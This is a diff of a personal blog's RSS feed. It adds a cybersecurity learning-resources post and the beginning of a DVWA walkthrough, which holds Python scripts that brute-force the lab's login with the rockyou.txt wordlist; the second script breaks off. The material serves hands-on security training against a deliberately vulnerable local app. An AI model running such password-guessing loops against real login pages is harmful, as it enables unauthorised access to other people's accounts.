@@ -1,7 +1,818 @@
-<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Gatsby Glass RSS Feed]]></title><description><![CDATA[Just a normal blog]]></description><link>https://gatsbyglass.netlify.app</link><generator>GatsbyJS</generator><lastBuildDate>Tue, 28 Feb 2023 21:13:11 GMT</lastBuildDate><item><title><![CDATA[Contact]]></title><description><![CDATA[Get in Touch. If you’ve got an inquiry for a fun project, fill the form right here.]]></description><link>https://gatsbyglass.netlify.app/contact/</link><guid isPermaLink="false">https://gatsbyglass.netlify.app/contact/</guid><content:encoded>&lt;h1&gt;Get in Touch.&lt;/h1&gt;
-&lt;p&gt;If you’ve got an inquiry for a fun project, fill the form right here.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[About Mee]]></title><description><![CDATA[Hi, I am Saai Sudarsanan]]></description><link>https://gatsbyglass.netlify.app/about/</link><guid isPermaLink="false">https://gatsbyglass.netlify.app/about/</guid><content:encoded>&lt;h1&gt;Hi, I am Saai Sudarsanan&lt;/h1&gt;
-&lt;hr&gt;</content:encoded></item><item><title><![CDATA[Home]]></title><description><![CDATA[Hunter Killer At a time, I don’t waste time.]]></description><link>https://gatsbyglass.netlify.app/</link><guid isPermaLink="false">https://gatsbyglass.netlify.app/</guid><content:encoded>&lt;h1&gt;Hunter Killer&lt;/h1&gt;
-&lt;p&gt;At a time, I don’t waste time.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Rust Programming Concepts]]></title><description><![CDATA[This post is my understanding of the common programming concepts, implemented in Rust. They cover stuff like, Variables and Mutability…]]></description><link>https://gatsbyglass.netlify.app/blog/rust-chap3/</link><guid isPermaLink="false">https://gatsbyglass.netlify.app/blog/rust-chap3/</guid><pubDate>Wed, 01 Mar 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;This post is my understanding of the common programming concepts, implemented in Rust. They cover stuff like,&lt;/p&gt;
+<?xml version="1.0" encoding="UTF-8"?><rss xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom" version="2.0"><channel><title><![CDATA[Gatsby Glass RSS Feed]]></title><description><![CDATA[Just a normal blog]]></description><link>https://gatsbyglass.netlify.app</link><generator>GatsbyJS</generator><lastBuildDate>Sat, 04 Mar 2023 11:47:46 GMT</lastBuildDate><item><title><![CDATA[Contact]]></title><description><![CDATA[Get in Touch. If you’ve got an inquiry for a fun project, fill the form right here.]]></description><link>https://gatsbyglass.netlify.app/contact/</link><guid isPermaLink="false">https://gatsbyglass.netlify.app/contact/</guid><content:encoded>&lt;h1&gt;Get in Touch.&lt;/h1&gt;
+&lt;p&gt;If you’ve got an inquiry for a fun project, fill the form right here.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Home]]></title><description><![CDATA[Hunter Killer At a time, I don’t waste time.]]></description><link>https://gatsbyglass.netlify.app/</link><guid isPermaLink="false">https://gatsbyglass.netlify.app/</guid><content:encoded>&lt;h1&gt;Hunter Killer&lt;/h1&gt;
+&lt;p&gt;At a time, I don’t waste time.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[About Mee]]></title><description><![CDATA[Hi, I am Saai Sudarsanan]]></description><link>https://gatsbyglass.netlify.app/about/</link><guid isPermaLink="false">https://gatsbyglass.netlify.app/about/</guid><content:encoded>&lt;h1&gt;Hi, I am Saai Sudarsanan&lt;/h1&gt;
+&lt;hr&gt;</content:encoded></item><item><title><![CDATA[Cyber Security Resources]]></title><description><![CDATA[I am glad to find so many people in my college being interested in Cyber Security. I would like to assure you that you have come to the…]]></description><link>https://gatsbyglass.netlify.app/blog/cybersec-resources/</link><guid isPermaLink="false">https://gatsbyglass.netlify.app/blog/cybersec-resources/</guid><pubDate>Sat, 04 Mar 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;I am glad to find so many people in my college being interested in Cyber Security. I would like to assure you that you have come to the right place to start your journey in this field. Let’s cut the introduction short and get to the point, I hope we’ll get to know each other better as time progresses. This WhatsApp group is to help you learn and get better in your domain(s) of interest in Cyber Security.&lt;/p&gt;
+&lt;p&gt;So, what are these domains I am talking about?&lt;/p&gt;
+&lt;h2&gt;Malware Analysis&lt;/h2&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Malware analysis is the process of understanding the behavior and purpose of a suspicious file or URL. The output of the analysis aids in the detection and mitigation of the potential threat.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;Resources :&lt;/h3&gt;
+&lt;p&gt;Practical Malware Analysis Book&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=uHhKkLwT4Mk&amp;#x26;list=PLBf0hzazHTGMSlOI2HZGc08ePwut6A2Io&quot;&gt;https://www.youtube.com/watch?v=uHhKkLwT4Mk&amp;#x26;list=PLBf0hzazHTGMSlOI2HZGc08ePwut6A2Io&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/c/JohnHammond010&quot;&gt;https://www.youtube.com/c/JohnHammond010&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/c/MalwareAnalysisForHedgehogs&quot;&gt;https://www.youtube.com/c/MalwareAnalysisForHedgehogs&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.first.org/global/sigs/malware/resources/&quot;&gt;https://www.first.org/global/sigs/malware/resources/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.sans.org/blog/how-you-can-start-learning-malware-analysis/&quot;&gt;https://www.sans.org/blog/how-you-can-start-learning-malware-analysis/&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;Digital Forensics and Incident Response&lt;/h2&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Digital forensics and incident response (DFIR) is a specialized field focused on identifying, remediating, and investigating cyber security incidents. Digital forensics includes collecting, preserving, and analyzing forensic evidence to paint a full, detailed picture of events.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;Resources :&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://dfirdiva.com/getting-into-dfir/&quot;&gt;https://dfirdiva.com/getting-into-dfir/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=-IUJnDs6rbE&quot;&gt;https://www.youtube.com/watch?v=-IUJnDs6rbE&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/c/SANSDigitalForensics/playlists&quot;&gt;https://www.youtube.com/c/SANSDigitalForensics/playlists&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/c/DFIRScience&quot;&gt;https://www.youtube.com/c/DFIRScience&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://itmasters.edu.au/free-short-course-information-security-incident-handling/&quot;&gt;https://itmasters.edu.au/free-short-course-information-security-incident-handling/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/channel/UCjFuM88y9_awcgxsek85YyQ&quot;&gt;https://www.youtube.com/channel/UCjFuM88y9_awcgxsek85YyQ&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;Practice :&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/stuxnet999/MemLabs&quot;&gt;https://github.com/stuxnet999/MemLabs&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.netresec.com/?page=PcapFiles&quot;&gt;https://www.netresec.com/?page=PcapFiles&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.malware-traffic-analysis.net/&quot;&gt;https://www.malware-traffic-analysis.net/&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;Reverse Engineering&lt;/h2&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Reverse engineering covers a broad range of areas, including decompiling and disassembling of executable files and libraries, and analysis of system data. In the field of computer security, reverse engineering is used to study malware activity and create tools to neutralize it.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;Resources :&lt;/h3&gt;
+&lt;p&gt;The Reversing Secrets of a Reverse Engineer book is pretty good, especially the 3 indexes in the back of the book.&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://github.com/OpenToAllCTF/REsources&quot;&gt;https://github.com/OpenToAllCTF/REsources&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/playlist?list=PL_tws4AXg7auglkFo6ZRoWGXnWL0FHAEi&quot;&gt;https://www.youtube.com/playlist?list=PL_tws4AXg7auglkFo6ZRoWGXnWL0FHAEi&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=a2EkORFcSZo&quot;&gt;https://www.youtube.com/watch?v=a2EkORFcSZo&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=fnYp2DN_XZc&quot;&gt;https://www.youtube.com/watch?v=fnYp2DN_XZc&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;Practice :&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://crackmes.one/&quot;&gt;https://crackmes.one/&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;Binary Exploitation&lt;/h2&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Binary exploitation is the process of subverting a compiled application such that it violates some trust boundary in a way that is advantageous to you, the attacker. In this module we are going to focus on memory corruption.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;Resources :&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.hoppersroppers.org/roadmap/training/pwning.html&quot;&gt;https://www.hoppersroppers.org/roadmap/training/pwning.html&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/channel/UCgTNupxATBfWmfehv21ym-g&quot;&gt;https://www.youtube.com/channel/UCgTNupxATBfWmfehv21ym-g&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://ir0nstone.gitbook.io/notes/types/stack/introduction&quot;&gt;https://ir0nstone.gitbook.io/notes/types/stack/introduction&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w&quot;&gt;https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://corruptedprotocol.medium.com/&quot;&gt;https://corruptedprotocol.medium.com/&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;Practice :&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://ropemporium.com/&quot;&gt;https://ropemporium.com/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://dojo.pwn.college/&quot;&gt;https://dojo.pwn.college/&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;Security Operations Center&lt;/h2&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;A security operations center — commonly referred to as a SOC — is a team that continuously monitors and analyzes the security procedures of an organization. It also defends against security breaches and actively isolates and mitigates security risks&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;Resources :&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/channel/UCfcDMqKt72afteeXBk99cmg/playlists&quot;&gt;https://www.youtube.com/channel/UCfcDMqKt72afteeXBk99cmg/playlists&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/c/AnandGuruSOCExperts/playlists&quot;&gt;https://www.youtube.com/c/AnandGuruSOCExperts/playlists&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;Practice :&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://letsdefend.io/&quot;&gt;https://letsdefend.io/&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;Web Application Pentesting&lt;/h2&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Web application penetration testing involves a methodological series of steps aimed at gathering information about the target system, finding vulnerabilities or faults in them, researching for exploits that will succeed against those faults or vulnerabilities and compromise the web application.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;Resources :&lt;/h3&gt;
+&lt;p&gt;Book : The Web Application Hacker’s Handbook&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/watch?v=2_lswM1S264&quot;&gt;https://www.youtube.com/watch?v=2_lswM1S264&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://owasp-academy.teachable.com/&quot;&gt;https://owasp-academy.teachable.com/&lt;/a&gt;&lt;/p&gt;
+&lt;h3&gt;Practice :&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://portswigger.net/web-security&quot;&gt;https://portswigger.net/web-security&lt;/a&gt; (Portswigger Labs)
+Damn Vulnerable Web Application&lt;/p&gt;
+&lt;p&gt;OWASP Juice Shop&lt;/p&gt;
+&lt;p&gt;OWASP Broken Web Apps&lt;/p&gt;
+&lt;h2&gt;Cryptography&lt;/h2&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;Cryptography is the study of secure communications techniques that allow only the sender and intended recipient of a message to view its contents. The term is derived from the Greek word kryptos, which means hidden.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;Resources :&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/playlist?list=PL1H1sBF1VAKU05UWhDDwl38CV4CIk7RLJ&quot;&gt;https://www.youtube.com/playlist?list=PL1H1sBF1VAKU05UWhDDwl38CV4CIk7RLJ&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://www.youtube.com/playlist?list=PL60F3F917709C7DD5&quot;&gt;https://www.youtube.com/playlist?list=PL60F3F917709C7DD5&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;Important Algorithms :&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;AES&lt;/li&gt;
+&lt;li&gt;RSA&lt;/li&gt;
+&lt;li&gt;DES&lt;/li&gt;
+&lt;li&gt;Diffie Hellman&lt;/li&gt;
+&lt;li&gt;ECC&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h3&gt;Practice :&lt;/h3&gt;
+&lt;p&gt;&lt;a href=&quot;https://cryptohack.org/&quot;&gt;https://cryptohack.org/&lt;/a&gt;&lt;/p&gt;
+&lt;h2&gt;Other Domains in Cyber Security Include :&lt;/h2&gt;
+&lt;ul&gt;
+&lt;li&gt;Network Security&lt;/li&gt;
+&lt;li&gt;Hardware Security&lt;/li&gt;
+&lt;li&gt;Threat Intelligence&lt;/li&gt;
+&lt;li&gt;Social Engineering&lt;/li&gt;
+&lt;li&gt;OSINT&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2&gt;BASICS&lt;/h2&gt;
+&lt;p&gt;&lt;em&gt;Python Basics :&lt;/em&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=8DvywoWv6fI&quot;&gt;https://www.youtube.com/watch?v=8DvywoWv6fI&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Linux -&lt;/em&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=VbEx7B_PTOE&amp;#x26;list=PLIhvC56v63IJIujb5cyE13oLuyORZpdkL&quot;&gt;https://www.youtube.com/watch?v=VbEx7B_PTOE&amp;#x26;list=PLIhvC56v63IJIujb5cyE13oLuyORZpdkL&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Bash Scripting-&lt;/em&gt; &lt;a href=&quot;https://www.youtube.com/watch?v=LTuuMtQR1uQ&amp;#x26;list=PLBf0hzazHTGMJzHon4YXGscxUvsFpxrZT&quot;&gt;https://www.youtube.com/watch?v=LTuuMtQR1uQ&amp;#x26;list=PLBf0hzazHTGMJzHon4YXGscxUvsFpxrZT&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://overthewire.org/wargames/bandit/&quot;&gt;https://overthewire.org/wargames/bandit/&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Web :&lt;/em&gt; &lt;a href=&quot;https://www.youtube.com/c/HackerSploit/search?query=webapp%20pentesting&quot;&gt;https://www.youtube.com/c/HackerSploit/search?query=webapp%20pentesting&lt;/a&gt;&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Solutions for DVWA]]></title><description><![CDATA[Brute Force Low and Medium In the  level we find that the password is being shared in the URL of the website, like, http://127.0.0.1/dvwa…]]></description><link>https://gatsbyglass.netlify.app/blog/dvwa-solutions/</link><guid isPermaLink="false">https://gatsbyglass.netlify.app/blog/dvwa-solutions/</guid><pubDate>Sat, 04 Mar 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;Brute Force&lt;/h1&gt;
+&lt;h2&gt;Low and Medium&lt;/h2&gt;
+&lt;p&gt;In the &lt;code class=&quot;language-text&quot;&gt;Brute Force Low&lt;/code&gt; level we find that the password is being shared in the URL of the website, like,&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;http://127.0.0.1/dvwa/vulnerabilities/brute/?username=admin&amp;#x26;password=123456&amp;#x26;Login=Login#&quot;&gt;http://127.0.0.1/dvwa/vulnerabilities/brute/?username=admin&amp;#x26;password=123456&amp;#x26;Login=Login#&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;We can brute force the different URLs using this code and the rockyou.txt wordlist.&lt;/p&gt;
+&lt;p&gt;If the password is wrong, I will get,
+&lt;code class=&quot;language-text&quot;&gt;Username and/or password incorrect.&lt;/code&gt;
+on the screen.&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;py&quot;&gt;&lt;pre class=&quot;language-py&quot;&gt;&lt;code class=&quot;language-py&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; requests
+&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;get_url&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;username&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;password&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token string-interpolation&quot;&gt;&lt;span class=&quot;token string&quot;&gt;f&quot;http://127.0.0.1/dvwa/vulnerabilities/brute/?username=&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;username&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&amp;amp;password=&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;password&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&amp;amp;Login=Login#&quot;&lt;/span&gt;&lt;/span&gt;
+
+username &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Enter Username : &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+
+COOKIES &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;token string&quot;&gt;&quot;PHPSESSID&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;pf9kipp16vs54366mr21smurse&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;token string&quot;&gt;&quot;security&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;high&quot;&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;with&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;rockyou.txt&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;as&lt;/span&gt; f&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+        p &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; f&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;readline&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;strip&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+        url &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; get_url&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;username&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+        r &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; requests&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;get&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;url&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;cookies&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;COOKIES&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Checking &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; p&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+        &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;incorrect&apos;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;in&lt;/span&gt; r&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+            &lt;span class=&quot;token keyword&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string-interpolation&quot;&gt;&lt;span class=&quot;token string&quot;&gt;f&quot;Found password for &lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;username&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt; = &lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;p&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+            &lt;span class=&quot;token keyword&quot;&gt;break&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+&lt;h2&gt;High&lt;/h2&gt;
+&lt;p&gt;Use the following code for High level&lt;/p&gt;
+&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;py&quot;&gt;&lt;pre class=&quot;language-py&quot;&gt;&lt;code class=&quot;language-py&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; requests
+&lt;span class=&quot;token keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;get_url&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;username&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;password&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;token&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;token string-interpolation&quot;&gt;&lt;span class=&quot;token string&quot;&gt;f&quot;http://127.0.0.1/dvwa/vulnerabilities/brute/?username=&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;username&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&amp;amp;password=&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;password&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&amp;amp;user_token=&lt;/span&gt;&lt;span class=&quot;token interpolation&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;token&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&amp;amp;Login=submit#&quot;&lt;/span&gt;&lt;/span&gt;
+username &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;input&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;Enter Username : &quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+COOKIES &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;token string&quot;&gt;&quot;PHPSESSID&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;km7qua1eth40r643ggc8ll6cbp&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;
+    &lt;span class=&quot;token string&quot;&gt;&quot;security&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;high&quot;&lt;/span&gt;
+&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;
+passwords &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token builtin&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;rockyou.txt&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;r&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;token keyword&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;token boolean&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;:&lt;/span&gt;
+    session &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; requests&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;Session&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
